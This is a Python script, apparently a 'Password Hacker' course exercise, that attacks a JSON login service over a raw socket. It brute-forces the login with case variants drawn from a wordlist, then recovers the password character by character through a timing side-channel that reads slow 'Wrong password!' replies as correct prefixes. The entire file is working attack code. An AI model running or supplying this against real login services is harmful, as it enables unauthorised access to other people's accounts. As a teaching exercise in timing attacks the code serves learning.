import argparse
import json
import time
from itertools import product, chain
import socket
from string import digits, ascii_lowercase, ascii_uppercase

parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port')


def main():
    args = parser.parse_args()
    address = args.host, int(args.port)
    with socket.socket() as my_socket:
        my_socket.connect(address)
        login_gen = gen_any_case_word()
        char_gen = gen_char()
        log_pass_json = {
            'login': '',
            'password': ''
        }

        while True:
            log_pass_json['login'] = next(login_gen)
            my_socket.send(json.dumps(log_pass_json).encode())
            response = json.loads(my_socket.recv(1024).decode())['result']
            if response != 'Wrong login!':
                break

        while True:
            log_pass_json['password'] = log_pass_json['password'][:-1] + next(char_gen)
            send_time = time.time()
            my_socket.send(json.dumps(log_pass_json).encode())
            response = json.loads(my_socket.recv(1024).decode())['result']
            response_time = time.time()
            if response == 'Wrong password!' and response_time - send_time > 0.1:
                char_gen = gen_char()
                log_pass_json['password'] = log_pass_json['password'] + ' '
            elif response == 'Connection success!':
                return json.dumps(log_pass_json)


def gen_char():
    for char in chain(ascii_lowercase, ascii_uppercase, digits):
        yield char


def gen_any_case_word(
        path=r'C:\Users\nikli\PycharmProjects\Password_Hacker\hacking\logins.txt'):
    with open(path) as passwords:
        for line in passwords:
            for case in product(*zip(line.strip().lower(), line.strip().upper())):
                yield ''.join(case).strip()


def gen_low_case_and_digit_password(len_limit=100):
    for i in range(1, len_limit):
        for password in product(chain(ascii_lowercase, digits), repeat=i):
            yield ''.join(password)


if __name__ == '__main__':
    print(main())
